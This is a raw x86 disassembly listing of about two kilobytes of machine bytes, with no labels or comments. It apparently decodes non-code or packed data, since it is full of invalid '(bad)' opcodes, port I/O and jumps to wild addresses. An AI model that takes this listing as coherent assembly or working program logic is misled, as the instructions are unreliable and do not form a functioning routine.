  40d389:	nop
  40d38a:	pop    es
  40d38b:	fst    DWORD PTR [ebx]
  40d38d:	jb     0x40d38e
  40d38f:	(bad)  
  40d390:	aaa    
  40d391:	push   eax
  40d392:	call   0xff5b135d
  40d397:	cmp    al,0x1a
  40d399:	sub    eax,DWORD PTR ds:0xff1a4fc6
  40d39f:	fadd   QWORD PTR [edx+0x12]
  40d3a2:	call   FWORD PTR [esi-0x611bafa1]
  40d3a8:	addr16 sbb bh,bh
  40d3ab:	add    al,0x1a
  40d3ad:	sub    eax,ebp
  40d3af:	lahf   
  40d3b0:	ja     0x40d3cc
  40d3b2:	inc    esp
  40d3b4:	pop    edx
  40d3b5:	adc    bh,bh
  40d3b7:	jbe    0x40d340
  40d3b9:	nop
  40d3ba:	pop    es
  40d3bb:	pop    ecx
  40d3bc:	xor    DWORD PTR [ecx-0x1],0x66
  40d3c0:	xchg   edi,eax
  40d3c1:	dec    edi
  40d3c2:	fsub   QWORD PTR [esi-0x61]
  40d3c5:	sbb    edi,edi
  40d3c7:	add    ah,bl
  40d3c9:	sbb    DWORD PTR [ebx],ebp
  40d3cb:	aad    0xa7
  40d3cd:	scas   eax,DWORD PTR es:[edi]
  40d3ce:	sbb    edi,edi
  40d3d0:	jl     0x40d3a0
  40d3d2:	adc    edi,edi
  40d3d4:	ds mov edi,0xdf49078f
  40d3da:	jo     0x40d3db
  40d3dc:	cs iret 
  40d3de:	dec    edi
  40d3df:	in     al,0x1e
  40d3e1:	xlat   BYTE PTR ds:[ebx]
  40d3e2:	sbb    eax,ebp
  40d3e4:	enter  0x19b8,0xff
  40d3e8:	push   ss
  40d3e9:	or     DWORD PTR [edi+eiz*1+0x6],ebx
  40d3ed:	adc    BYTE PTR [esi],bl
  40d3ef:	sub    esp,DWORD PTR [edi-0x1e5e98f]
  40d3f5:	push   ebp
  40d3f6:	add    DWORD PTR [edx],edx
  40d3f8:	test   BYTE PTR [edi],0x11
  40d3fb:	jbe    0x40d3c5
  40d3fd:	paddd  mm3,QWORD PTR [ecx]
  40d400:	pushf  
  40d401:	sub    al,0xfe
  40d403:	sbb    esi,ebx
  40d405:	and    BYTE PTR [ecx+0x7c],ah
  40d408:	(bad)  
  40d409:	(bad)  
  40d40b:	dec    edi
  40d40c:	jmp    0xd95ab228
  40d411:	lea    ebp,[edi+0x19]
  40d414:	mov    esi,0xbe30940f
  40d419:	shufps xmm5,XMMWORD PTR [ebx+eiz*1],0x72
  40d41e:	mov    esi,0xb955a619
  40d423:	adc    DWORD PTR [esi+0x2a8fae0f],ebx
  40d429:	adc    BYTE PTR [esp+ecx*1],bl
  40d42c:	add    BYTE PTR [ecx-0x79e660f9],bl
  40d432:	subps  xmm2,XMMWORD PTR [esi+eax*4]
  40d436:	jle    0x86b2b368
  40d43c:	sbb    DWORD PTR [esi-0x3b],ebp
  40d43f:	sub    BYTE PTR [ebx],0x4a
  40d442:	pcmpeqd mm3,QWORD PTR [ecx]
  40d445:	pop    esi
  40d446:	xchg   ebp,eax
  40d447:	ins    BYTE PTR es:[edi],dx
  40d448:	sub    al,0xe3
  40d44a:	test   ecx,ebp
  40d44c:	add    edi,DWORD PTR [eax+0x4a]
  40d44f:	in     eax,dx
  40d450:	add    ebx,esp
  40d452:	add    DWORD PTR [ebp-0x7b],0x75
  40d456:	or     al,0xc3
  40d458:	add    ecx,ebx
  40d45a:	out    dx,eax
  40d45b:	inc    ebp
  40d45c:	(bad)  
  40d45d:	ss and ecx,edx
  40d460:	jno    0x40d488
  40d462:	verr   WORD PTR [eax-0x22]
  40d466:	adc    ch,BYTE PTR [eax+0x3a]
  40d469:	fxch   st(1)
  40d46b:	jmp    DWORD PTR ds:0xa84854fe
  40d471:	xor    cl,BYTE PTR [esi]
  40d473:	jne    0x40d456
  40d475:	dec    edx
  40d476:	dec    ecx
  40d477:	std    
  40d478:	push   cs
  40d479:	sbb    BYTE PTR [ecx+0xef3a5f2],ah
  40d47f:	addr16 jmp 0x40d4b4
  40d482:	or     DWORD PTR [eax-0x17f9500a],eax
  40d488:	aas    
  40d489:	ds push cs
  40d48b:	jmp    esi
  40d48d:	mov    edi,0x54ff12
  40d492:	xor    eax,0x197f7b21
  40d497:	push   cs
  40d498:	leave  
  40d499:	stos   DWORD PTR es:[edi],eax
  40d49a:	mov    dh,0xe
  40d49c:	push   esp
  40d49d:	jb     0x40d4f5
  40d49f:	mov    al,ah
  40d4a1:	mov    ebp,0xe969b7e0
  40d4a6:	int3   
  40d4a7:	out    dx,al
  40d4a8:	(bad)  
  40d4a9:	xor    al,0x25
  40d4ab:	and    DWORD PTR ds:0x890e297f,ebx
  40d4b1:	and    al,0x29
  40d4b3:	xor    BYTE PTR ds:0xffc96ad3,0x61
  40d4ba:	pop    edi
  40d4bb:	int3   
  40d4bc:	inc    edi
  40d4bd:	sub    BYTE PTR ds:0xb6e93f89,dh
  40d4c3:	test   eax,0xc9a62867
  40d4c8:	call   DWORD PTR [esi]
  40d4ca:	add    eax,0x32e984d3
  40d4cf:	mov    ecx,0xc97e1467
  40d4d4:	(bad)  
  40d4d5:	mov    ebp,0xe984df0a
  40d4da:	xor    dh,BYTE PTR [ebx+0x7f58000a]
  40d4e0:	add    ecx,DWORD PTR [ebx]
  40d4e2:	dec    edx
  40d4e3:	jle    0x40d50e
  40d4e5:	push   esi
  40d4e6:	jo     0x40d55f
  40d4e8:	mov    eax,ds:0x4c6247ff
  40d4ed:	pop    ebp
  40d4ee:	(bad)  [ecx]
  40d4f0:	push   eax
  40d4f1:	call   0x3f6b81
  40d4f6:	add    BYTE PTR [eax-0x800009f],bh
  40d4fc:	mov    al,0x67
  40d4fe:	dec    eax
  40d4ff:	xchg   ebp,eax
  40d500:	dec    edx
  40d501:	dec    DWORD PTR [edi-0x19]
  40d504:	jnp    0x40d50d
  40d506:	call   0x3fa071
  40d50b:	xor    BYTE PTR [ecx-0x1e280068],cl
  40d511:	add    BYTE PTR [esi+0x58],al
  40d514:	aaa    
  40d515:	push   DWORD PTR [edx+eiz*8+0x4e]
  40d519:	sti    
  40d51a:	xor    ecx,DWORD PTR [eax+0x77fffeab]
  40d520:	cmc    
  40d521:	icebp  
  40d522:	scas   al,BYTE PTR es:[edi]
  40d523:	xor    BYTE PTR [esi],cl
  40d525:	je     0x40d4c6
  40d527:	out    0x77,eax
  40d529:	sti    
  40d52a:	call   FWORD PTR [ebp-0x3]
  40d52d:	out    0xe3,eax
  40d52f:	or     eax,0x465ffef6
  40d534:	mov    esp,0x588804c1
  40d539:	mov    ch,ah
  40d53b:	or     ecx,ecx
  40d53d:	sti    
  40d53e:	jmp    FWORD PTR [ebp+0x5]
  40d541:	push   DWORD PTR [ebp+0x60]
  40d544:	loope  0x40d53f
  40d546:	xchg   edx,eax
  40d547:	out    0xf5,eax
  40d549:	mov    BYTE PTR [ebp-0x3c],al
  40d54c:	cmc    
  40d54d:	je     0x40d54b
  40d54f:	xlat   BYTE PTR ds:[ebx]
  40d550:	ja     0x40d559
  40d552:	call   0x3f6ec9
  40d557:	xor    DWORD PTR [ebx+0x2a000bc8],ebp
  40d55d:	loopne 0x40d4ee
  40d55f:	inc    ecx
  40d560:	mov    dl,0x9
  40d562:	add    al,0x74
  40d564:	fs retf 
  40d566:	nop
  40d567:	sti    
  40d568:	or     DWORD PTR [eax+0x7b],esp
  40d56b:	call   DWORD PTR [esi]
  40d56d:	jae    0x40d585
  40d56f:	jne    0x40d5ae
  40d571:	jecxz  0x40d503
  40d573:	sti    
  40d574:	popa   
  40d575:	jmp    0x40d507
  40d577:	pop    es
  40d578:	or     ecx,eax
  40d57a:	jno    0x40d57b
  40d57c:	neg    BYTE PTR [eax-0x76]
  40d57f:	dec    ebp
  40d580:	cmp    eax,0x5dffdc9f
  40d585:	sbb    BYTE PTR [ecx+0x16ba2ce7],dh
  40d58b:	dec    DWORD PTR [edx]
  40d58d:	loop   0x40d5b9
  40d58f:	adc    al,0xb2
  40d591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d592:	repz inc DWORD PTR [edx+0x1a]
  40d596:	mov    al,BYTE PTR [ebp+0x21]
  40d599:	xor    edx,DWORD PTR [eax-0x75dd5905]
  40d59f:	ret    0x209a
  40d5a2:	jmp    0x400:0x76078bf
  40d5a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5aa:	call   FWORD PTR es:[esi+ebp*1]
  40d5ae:	push   ss
  40d5af:	jne    0x40d5ea
  40d5b1:	jp     0x40d539
  40d5b3:	xchg   edx,eax
  40d5b4:	xchg   BYTE PTR [ebx+0x16],ch
  40d5b7:	jne    0x40d5e6
  40d5b9:	rcl    BYTE PTR [esi],cl
  40d5bb:	jne    0x40d5e6
  40d5bd:	mov    bh,dh
  40d5bf:	xchg   edx,eax
  40d5c0:	add    BYTE PTR [esi-0x7d],ch
  40d5c3:	dec    esp
  40d5c4:	ret    0x2239
  40d5c7:	mov    al,0x8a
  40d5c9:	dec    ebp
  40d5ca:	lahf   
  40d5cb:	ds sar bh,0xf2
  40d5cf:	mov    dl,0x82
  40d5d1:	int3   
  40d5d2:	or     cl,dh
  40d5d4:	add    edi,DWORD PTR [ebp+0x2a9869f6]
  40d5da:	or     ebp,ebx
  40d5dc:	pop    es
  40d5dd:	mov    dl,0x8e
  40d5df:	clc    
  40d5e0:	add    esp,DWORD PTR [ebp+0x42986a03]
  40d5e6:	or     DWORD PTR [esp+ecx*1-0x496db6b6],esi
  40d5ed:	je     0x40d631
  40d5ef:	sub    esi,ebx
  40d5f1:	push   cs
  40d5f2:	jg     0x40d5a0
  40d5f4:	pop    es
  40d5f5:	mov    dl,0x28
  40d5f7:	out    0x82,al
  40d5f9:	jl     0x40d5f8
  40d5fb:	call   0x2941088f
  40d600:	(bad)  
  40d601:	cmp    eax,esp
  40d603:	sub    BYTE PTR [edx+0x412fab87],bh
  40d609:	inc    ecx
  40d60a:	or     DWORD PTR [edx-0x40],esp
  40d60d:	inc    edx
  40d60e:	mov    BYTE PTR [ecx],cl
  40d610:	(bad)  
  40d611:	mov    bl,0x8d
  40d613:	cld    
  40d614:	add    edi,DWORD PTR ds:0x4543f205
  40d61a:	add    al,BYTE PTR [edx]
  40d61c:	inc    esp
  40d61d:	pop    edx
  40d61e:	lods   al,BYTE PTR ds:[esi]
  40d61f:	cs dec ebx
  40d621:	jae    0x40d61b
  40d623:	call   0xbcbd710
  40d628:	xor    al,0x8
  40d62a:	scas   al,BYTE PTR es:[edi]
  40d62b:	lds    ebp,FWORD PTR [eax-0x1db7137f]
  40d631:	adc    al,0x4
  40d633:	dec    ecx
  40d634:	xchg   ecx,eax
  40d635:	call   0xc5a8:0x189e0b9f
  40d63c:	lods   al,BYTE PTR ds:[esi]
  40d63d:	mov    esp,esi
  40d63f:	inc    esp
  40d640:	dec    edi
  40d641:	lods   eax,DWORD PTR ds:[esi]
  40d642:	or     eax,0x3a5ae8ca
  40d647:	or     ecx,ebp
  40d649:	add    esp,DWORD PTR [edx+0x64]
  40d64c:	add    BYTE PTR [edx-0x5a],ah
  40d64f:	add    ecx,DWORD PTR [ebx-0x5be7c6e4]
  40d655:	je     0x40d5dd
  40d657:	sbb    edx,DWORD PTR [eax+0x5e]
  40d65a:	scas   al,BYTE PTR es:[edi]
  40d65b:	dec    ebx
  40d65c:	(bad)  
  40d65d:	fdivr  st(6),st
  40d65f:	and    BYTE PTR [edi-0x78],dh
  40d662:	inc    esp
  40d663:	or     bh,bh
  40d665:	mov    esp,0x56312166
  40d66a:	inc    esp
  40d66b:	or     bh,bh
  40d66d:	mov    esp,0x29457a2e
  40d672:	mov    al,0xc4
  40d674:	mov    edi,0xbf941c02
  40d679:	adc    edi,ebp
  40d67b:	jae    0x40d67c
  40d67d:	push   ss
  40d67e:	stos   BYTE PTR es:[edi],al
  40d67f:	(bad)
  40d683:	(bad)
  40d687:	sbb    cl,BYTE PTR [ebx+0x501e007c]
  40d68d:	adc    cl,ch
  40d68f:	xor    cl,BYTE PTR [ecx]
  40d691:	repz inc ebp
  40d693:	addr16 mov dl,0x5c
  40d696:	sub    BYTE PTR ds:0x32e90b50,ch
  40d69c:	or     ebx,esi
  40d69e:	lea    ebp,[ecx+0x77620794]
  40d6a4:	(bad)  
  40d6a5:	repnz lea ebp,[edi+0x4419dfc4]
  40d6ac:	xchg   esp,eax
  40d6ad:	mov    edi,0xe846a7b6
  40d6b2:	pop    es
  40d6b3:	adc    cl,BYTE PTR [edx]
  40d6b5:	jmp    DWORD PTR [esi-0x7617b949]
  40d6bb:	or     al,0xa
  40d6bd:	call   DWORD PTR [ebp+0x5cef94af]
  40d6c3:	mov    DWORD PTR [edx-0x47],0x68800
  40d6ca:	add    bl,bl
  40d6cc:	test   eax,0xafa8758c
  40d6d1:	pop    es
  40d6d2:	add    BYTE PTR [eax+0x6],bl
  40d6d5:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6d7:	bound  eax,QWORD PTR [edi]
  40d6d9:	lea    eax,[ebp+0x0]
  40d6dc:	push   esi
  40d6dd:	out    0x68,eax
  40d6df:	stos   BYTE PTR es:[edi],al
  40d6e0:	push   es
  40d6e1:	add    BYTE PTR [ebx+0x7d8a1605],cl
  40d6e7:	add    al,0xc7
  40d6e9:	out    dx,al
  40d6ea:	add    esp,DWORD PTR [ebx]
  40d6ec:	cmc    
  40d6ed:	jae    0x40d756
  40d6ef:	add    BYTE PTR [ebx+0x5],dh
  40d6f2:	lea    eax,[ebp+0x70]
  40d6f5:	push   esi
  40d6f6:	push   ebp
  40d6f7:	push   esi
  40d6f8:	and    bh,ch
  40d6fa:	mov    ds:0xc6890800,eax
  40d6ff:	or     bh,cl
  40d701:	add    bh,bh
  40d703:	jne    0x40d6f2
  40d705:	add    eax,0x892f46b6
  40d70a:	clc    
  40d70b:	or     BYTE PTR [edi+0x8],ah
  40d70e:	sub    esi,eax
  40d710:	repz jp 0x40d722
  40d713:	ror    esi,1
  40d715:	pusha  
  40d716:	jmp    FWORD PTR [ecx-0x28]
  40d719:	imul   edi,edi,0x69
  40d71c:	enter  0xfe4f,0x75
  40d720:	mov    eax,0x9869ff6b
  40d725:	in     eax,dx
  40d726:	mov    ebp,0xb059881
  40d72b:	shl    BYTE PTR [esp+ebp*1+0x4f],0x50
  40d730:	jo     0x40d6b4
  40d732:	xchg   esi,eax
  40d733:	(bad)  
  40d734:	fisttp WORD PTR [ecx+0x52259d7]
  40d73a:	push   0x0
  40d73c:	cmp    DWORD PTR [edx+0x55],edx
  40d73f:	push   DWORD PTR [ecx]
  40d741:	in     eax,dx
  40d742:	repz imul esi,DWORD PTR [ecx],0xc4e80406
  40d749:	mov    al,ds:0x602a0003
  40d74e:	cdq    
  40d74f:	pop    es
  40d750:	add    cl,BYTE PTR [eax+0x4e0095bf]
  40d756:	call   0x5eae:0xdebadade
  40d75d:	(bad)  
  40d75f:	inc    ebp
  40d760:	adc    BYTE PTR [ecx],dh
  40d762:	dec    ebp
  40d763:	jle    0x40d751
  40d765:	mov    dl,0x2e
  40d767:	adc    al,0x57
  40d769:	sbb    BYTE PTR [ebx],0x2f
  40d76c:	jmp    DWORD PTR [esi+esi*8+0x4a297511]
  40d773:	cmp    edx,DWORD PTR [eax-0x14bc7f2]
  40d779:	jl     0x40d775
  40d77b:	sbb    cl,BYTE PTR [ebx+eiz*4-0x674ecd9]
  40d782:	mov    edx,0x323af805
  40d787:	cwde   
  40d788:	inc    esi
  40d789:	mov    ah,0xb5
  40d78b:	push   ss
  40d78c:	push   eax
  40d78d:	fidivr WORD PTR [ebp-0x1]
  40d790:	(bad)  
  40d791:	pop    esp
  40d792:	jmp    0x8911:0xf7ccab1a
  40d799:	ins    BYTE PTR es:[edi],dx
  40d79a:	out    dx,al
  40d79b:	jg     0x40d7e2
  40d79d:	rol    DWORD PTR [edx+0x13],0x75
  40d7a1:	and    eax,0x990797df
  40d7a6:	jns    0x40d7b8
  40d7a8:	jmp    DWORD PTR [esi-0x61083787]
  40d7ae:	cmp    eax,0xba1cff14
  40d7b3:	adc    DWORD PTR [ebp-0x7b],esi
  40d7b6:	mov    bh,0x97
  40d7b8:	sti    
  40d7b9:	add    BYTE PTR [ecx+0x7e11f809],bl
  40d7bf:	or     BYTE PTR [edx+0x2b],dh
  40d7c2:	jbe    0x40d842
  40d7c4:	xchg   ebp,eax
  40d7c5:	sbb    ecx,DWORD PTR [ebx+0x66128d9e]
  40d7cb:	jle    0x40d74e
  40d7cd:	sbb    eax,DWORD PTR [ebx-0x34ed8262]
  40d7d3:	or     BYTE PTR [esi],bl
  40d7d5:	adc    eax,esp
  40d7d7:	adc    BYTE PTR [ecx+0x6608b59d],al
  40d7dd:	jle    0x40d851
  40d7df:	fs mov esi,0xe911733c
  40d7e5:	mov    eax,0x9069f4bb
  40d7ea:	cmp    cl,BYTE PTR [edi]
  40d7ec:	mov    ebx,0xd97e1fe4
  40d7f1:	adc    bl,BYTE PTR [ecx+edx*1+0x7beba41]
  40d7f8:	adc    bh,BYTE PTR cs:[ecx+ebx*1+0x26]
  40d7fd:	cwde   
  40d7fe:	ss icebp 
  40d800:	dec    ebp
  40d801:	adc    dh,dh
  40d803:	pop    es
  40d804:	push   ss
  40d805:	cwde   
  40d806:	or     BYTE PTR ds:[ebx+edi*8+0x1203acce],dl
  40d80e:	fiadd  WORD PTR [edi]
  40d810:	je     0x40d805
  40d812:	xlat   BYTE PTR ds:[ebx]
  40d813:	jge    0x40d7f6
  40d815:	sbb    edi,DWORD PTR [ebx+0x8]
  40d818:	out    dx,al
  40d819:	adc    DWORD PTR [edx+0x7afd5d],edi
  40d81f:	xor    ecx,DWORD PTR [eax]
  40d821:	push   esp
  40d822:	hlt    
  40d823:	mov    bh,0x7d
  40d825:	loope  0x40d842
  40d827:	mov    eax,0xb211ce05
  40d82c:	test   ebp,esi
  40d82e:	add    al,0x27
  40d830:	pop    ds
  40d831:	mov    esi,0x82697
  40d836:	cmp    al,0x8d
  40d838:	out    dx,eax
  40d839:	ja     0x40d7e7
  40d83b:	and    BYTE PTR [eax],cl
  40d83d:	call   FWORD PTR [eax*4+0x1af17506]
  40d844:	jbe    0x40d843
  40d846:	xchg   esi,eax
  40d847:	inc    eax
  40d848:	or     BYTE PTR [ebp-0x7],dh
  40d84b:	les    ebx,FWORD PTR [edi]
  40d84d:	(bad)  
  40d84e:	cld    
  40d84f:	pop    edx
  40d850:	out    dx,eax
  40d851:	sbb    BYTE PTR [ecx+0x40],0x8
  40d855:	(bad)  
  40d856:	cld    
  40d857:	inc    edx
  40d858:	push   es
  40d859:	jne    0x40d83c
  40d85b:	sub    bh,bl
  40d85d:	mov    fs,WORD PTR [esi+0x20]
  40d860:	rol    cl,cl
  40d862:	stc    
  40d863:	xor    bl,BYTE PTR [esi-0x75]
  40d866:	inc    ebp
  40d867:	inc    eax
  40d868:	jl     0x40d876
  40d86a:	ret    
  40d86b:	xor    eax,DWORD PTR [esi]
  40d86d:	jne    0x40d860
  40d86f:	cmp    ch,BYTE PTR [ebx-0x70]
  40d872:	ds inc eax
  40d874:	push   es
  40d875:	jne    0x40d85c
  40d877:	and    DWORD PTR [eax+ecx*1+0x41],edi
  40d87b:	pop    eax
  40d87c:	pop    es
  40d87d:	jmp    DWORD PTR [esi]
  40d87f:	jl     0x40d8dd
  40d881:	adc    BYTE PTR [eax+0x0],dh
  40d884:	das    
  40d885:	push   es
  40d886:	jne    0x40d86d
  40d888:	inc    ecx
  40d889:	jl     0x40d893
  40d88b:	add    DWORD PTR [eax],ebp
  40d88d:	pop    es
  40d88e:	inc    DWORD PTR [esi]
  40d890:	pop    esp
  40d891:	pop    esp
  40d892:	adc    al,0x70
  40d894:	das    
  40d895:	push   es
  40d896:	jne    0x40d87d
  40d898:	and    DWORD PTR [eax+ecx*1+0x1],edi
  40d89c:	js     0x40d8a5
  40d89e:	jmp    esi
  40d8a0:	cmp    eax,0x2c70185c
  40d8a5:	rol    cl,1
  40d8a7:	std    
  40d8a8:	xor    bl,BYTE PTR [ebx+ecx*4-0x43]
  40d8ac:	lods   eax,DWORD PTR ds:[esi]
  40d8ad:	int    0xeb
  40d8af:	add    BYTE PTR [esi],bh
  40d8b1:	sar    ch,0x75
  40d8b4:	jl     0x40d85a
  40d8b6:	(bad)  
  40d8b7:	dec    BYTE PTR [ebp+0x5]
  40d8ba:	out    0x19,eax
  40d8bc:	call   0x1e40d7d9
  40d8c1:	add    esi,edi
  40d8c3:	jne    0x40d845
  40d8c5:	and    cl,BYTE PTR [edx-0x74e63871]
  40d8cb:	lock mov cl,0xd5
  40d8ce:	(bad)  
  40d8cf:	dec    DWORD PTR [eax-0x7b]
  40d8d2:	inc    ebp
  40d8d3:	adc    al,0xcb
  40d8d5:	sar    esi,1
  40d8d7:	je     0x40d936
  40d8d9:	and    esi,DWORD PTR [esi]
  40d8db:	add    DWORD PTR [eax+0xa],ebx
  40d8de:	mov    DWORD PTR [ebp-0x2c],0x48000009
  40d8e5:	xchg   DWORD PTR [ebp-0x4],eax
  40d8e8:	add    al,ch
  40d8ea:	sbb    BYTE PTR [ebp+0x14],dh
  40d8ed:	ja     0x40d88e
  40d8ef:	push   cs
  40d8f0:	(bad)  
  40d8f1:	fld    QWORD PTR [ecx]
  40d8f3:	out    0xf2,eax
  40d8f5:	push   esi
  40d8f6:	sbb    edi,edi
  40d8f8:	mov    eax,DWORD PTR [eax-0x73]
  40d8fb:	jl     0x40d8f9
  40d8fd:	sbb    BYTE PTR [esi-0x495597df],bl
  40d903:	aas    
  40d904:	add    BYTE PTR [edi],dl
  40d906:	lahf   
  40d907:	cli    
  40d908:	call   0x4063f5
  40d90d:	ror    DWORD PTR [ecx+0x75],cl
  40d910:	or     eax,0x415ba3c0
  40d915:	enter  0x7518,0xfc
  40d919:	xor    BYTE PTR [ecx],bl
  40d91b:	add    BYTE PTR [eax],0xd8
  40d91e:	add    BYTE PTR [ebp-0x14],0xe3
  40d922:	or     eax,0xce445c7
  40d927:	add    BYTE PTR [eax],al
  40d929:	xor    eax,esi
  40d92b:	cmp    DWORD PTR [ebp-0x6b],0x91796ef
  40d932:	icebp  
  40d933:	add    ch,bh
  40d935:	xlat   BYTE PTR ds:[ebx]
  40d936:	(bad)  
  40d937:	cwde   
  40d938:	or     ebx,DWORD PTR [ecx-0x79008c24]
  40d93e:	mov    dh,0x98
  40d940:	sti    
  40d941:	jle    0x40d967
  40d943:	add    al,ch
  40d945:	std    
  40d946:	or     BYTE PTR [edi],0xff
  40d949:	pop    eax
  40d94a:	push   0x4
  40d94c:	add    BYTE PTR [eax],al
  40d94e:	xor    DWORD PTR [ebx-0x37],ebp
  40d951:	adc    esi,DWORD PTR [edx+0x2c7502c7]
  40d957:	cdq    
  40d958:	test   DWORD PTR [eax],eax
  40d95a:	xor    eax,esi
  40d95c:	inc    ebp
  40d95d:	inc    ebp
  40d95e:	dec    ecx
  40d95f:	out    dx,eax
  40d960:	add    al,BYTE PTR [eax]
  40d962:	xor    DWORD PTR [edi],esi
  40d964:	leave  
  40d965:	repz xor eax,esi
  40d968:	add    al,BYTE PTR [eax]
  40d96a:	div    BYTE PTR [ebp-0xdceffee]
  40d970:	add    cl,BYTE PTR [ebp-0x734bbd8c]
  40d976:	ins    BYTE PTR es:[edi],dx
  40d977:	ds mov ah,0x8c
  40d97a:	je     0x40d9b6
  40d97c:	mov    ah,0xfe
  40d97e:	jl     0x40d95e
  40d980:	or     eax,0x251a2975
  40d985:	(bad)  
  40d986:	mul    BYTE PTR [ebx]
  40d988:	cmp    DWORD PTR [ebp-0x23],0xfffffff2
  40d98c:	xchg   esi,eax
  40d98d:	xor    dh,BYTE PTR [edx+0x65000a95]
  40d993:	fld    QWORD PTR [ecx-0x680d2283]
  40d999:	add    eax,0x137db2
  40d99e:	cmp    eax,0xb9750dd1
  40d9a3:	or     esi,esp
  40d9a5:	cwde   
  40d9a6:	sub    dh,cl
  40d9a8:	stc    
  40d9a9:	je     0x40d959
  40d9ab:	add    al,0xd6
  40d9ad:	cwde   
  40d9ae:	mov    ds:0x5404,al
  40d9b3:	mov    DWORD PTR [ecx],edx
  40d9b5:	pop    eax
  40d9b6:	push   cs
  40d9b7:	xchg   esi,eax
  40d9b8:	add    al,0x34
  40d9ba:	adc    al,0x8e
  40d9bc:	jle    0x40d9a3
  40d9be:	sbb    eax,DWORD PTR [ecx+ebx*4+0x7e7e0ead]
  40d9c5:	mov    eax,ds:0x9d98931b
  40d9ca:	push   cs
  40d9cb:	outs   dx,BYTE PTR ds:[esi]
  40d9cc:	jle    0x40d96b
  40d9ce:	sbb    ecx,DWORD PTR [ebx+0x5e0e8d98]
  40d9d4:	jle    0x40da4f
  40d9d6:	sbb    eax,DWORD PTR [ebx-0x1f18268]
  40d9dc:	pcmpeqd mm7,mm6
  40d9df:	lods   eax,DWORD PTR ds:[esi]
  40d9e0:	jbe    0x40da50
  40d9e2:	push   cs
  40d9e3:	ds mov bl,ah
  40d9e6:	pop    ds
  40d9e7:	xor    DWORD PTR [ebp-0x1],edi
  40d9ea:	cdq    
  40d9eb:	cs add ebx,esp
  40d9ee:	dec    DWORD PTR [esi]
  40d9f0:	outs   dx,DWORD PTR ds:[esi]
  40d9f1:	jns    0x40da01
  40d9f3:	push   ds
  40d9f4:	outs   dx,DWORD PTR ds:[esi]
  40d9f5:	jmp    0x51567608
  40d9fa:	mov    ds:0x993603be,eax
  40d9ff:	push   es
  40da00:	add    esi,DWORD PTR [edi+edi*8+0xe795b16]
  40da07:	test   BYTE PTR [ebx],0x94
  40da0a:	psubusw mm4,QWORD PTR [ebp+0x52e60e79]
  40da11:	loop   0x40da28
  40da13:	mov    es,WORD PTR cs:[ebx+0xd]
  40da17:	add    dh,dl
  40da19:	add    ebx,DWORD PTR [esi-0x390653]
  40da1f:	fdiv   DWORD PTR [edx]
  40da21:	pop    esi
  40da22:	mov    edi,ebp
  40da24:	mov    al,0xcc
  40da26:	jecxz  0x40da67
  40da28:	and    al,0x7e
  40da2a:	or     cl,dl
  40da2c:	fmul   DWORD PTR [esi+0x4e2ad6fe]
  40da32:	hlt    
  40da33:	push   0xffffffae
  40da35:	test   DWORD PTR [edi],0xbb9b3a
  40da3b:	jmp    0xa09ee372
  40da40:	repz adc BYTE PTR [eax],al
  40da43:	scas   al,BYTE PTR es:[edi]
  40da44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da45:	or     ebp,eax
  40da47:	adc    al,0xf6
  40da49:	add    edi,edi
  40da4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da4c:	jbe    0x40da49
  40da4e:	add    cl,ch
  40da50:	xor    cl,BYTE PTR [ecx]
  40da52:	lea    esp,[ebp*1+0x5afcff59]
  40da59:	jmp    0x40da57
  40da5b:	ins    BYTE PTR es:[edi],dx
  40da5c:	cmp    al,0x4
  40da5e:	mov    DWORD PTR [ecx+eiz*1],ebp
  40da61:	mov    BYTE PTR [ecx+esi*2+0x35],bh
  40da65:	jge    0x40da73
  40da67:	push   0xffffffa6
  40da69:	inc    DWORD PTR [ecx]
  40da6b:	(bad)  [esi+eax*4]
  40da6e:	jl     0x40dac5
  40da70:	das    
  40da71:	jnp    0x40da7d
  40da73:	xchg   ecx,eax
  40da74:	xor    cl,BYTE PTR [ecx]
  40da76:	add    cl,ch
  40da78:	(bad)  
  40da79:	rol    ecx,1
  40da7b:	icebp  
  40da7c:	add    BYTE PTR [edx],dh
  40da7e:	xchg   esp,eax
  40da7f:	inc    esp
  40da80:	xor    DWORD PTR [ebp+0x1ae17503],edi
  40da86:	xlat   BYTE PTR ds:[ebx]
  40da87:	mov    WORD PTR [esi],fs
  40da89:	and    al,0x86
  40da8b:	jl     0x40daae
  40da8d:	xor    eax,0x72e2047d
  40da92:	jge    0x40da9e
  40da94:	push   ecx
  40da95:	xor    cl,BYTE PTR [ecx]
  40da97:	add    BYTE PTR [eax],al
  40da99:	enter  0xc7b4,0xc2
  40da9d:	rol    BYTE PTR [esi],0x83
  40daa0:	jge    0x40da5e
  40daa2:	or     esi,DWORD PTR [edx+0x1f]
  40daa5:	pop    ebp
  40daa6:	retf   0x50f6
  40daa9:	(bad)  
  40daaa:	cmc    
  40daab:	std    
  40daac:	jne    0x40da4e
  40daae:	push   ds
  40daaf:	mov    ?,WORD PTR cs:[edi+0x15]
  40dab3:	lea    eax,[ebp-0x80]
  40dab6:	mov    dh,0xfd
  40dab8:	jne    0x40da5a
  40daba:	push   ds
  40dabb:	sahf   
  40dabc:	(bad)  
  40dabd:	iret   
  40dabe:	adc    eax,0x21744589
  40dac3:	sbb    eax,0x5015558d
  40dac8:	call   DWORD PTR ds:0xdd8de705
  40dace:	adc    al,0xff
  40dad0:	mov    DWORD PTR ds:0xc0458d31,edx
  40dad6:	mov    dh,0x68
  40dad8:	add    al,0xaf
  40dada:	fwait
  40dadb:	push   es
  40dadc:	call   0x405f39
  40dae1:	add    ch,cl
  40dae3:	retf   0x50f6
  40dae6:	iret   
  40dae7:	call   0xffff:0xffbe806
  40daee:	fwait
  40daef:	xchg   ebx,eax
  40daf0:	loop   0x40daf3
  40daf2:	add    eax,0x80458bf4
  40daf7:	mov    dh,0xfd
  40daf9:	jne    0x40db67
  40dafb:	adc    eax,0x9b4f0c75
  40db00:	push   es
  40db01:	call   0x3fedb4
  40db06:	pop    ebp
  40db07:	retf   
  40db08:	not    BYTE PTR [eax+0x4f]
  40db0b:	fwait
  40db0c:	push   es
  40db0d:	call   0x3feb91
  40db12:	xor    DWORD PTR [edi-0x72],ebp
  40db15:	div    DWORD PTR [ecx]
  40db17:	popf   
  40db18:	clc    
  40db19:	mov    bh,0x31
  40db1b:	lock add al,BYTE PTR [eax]
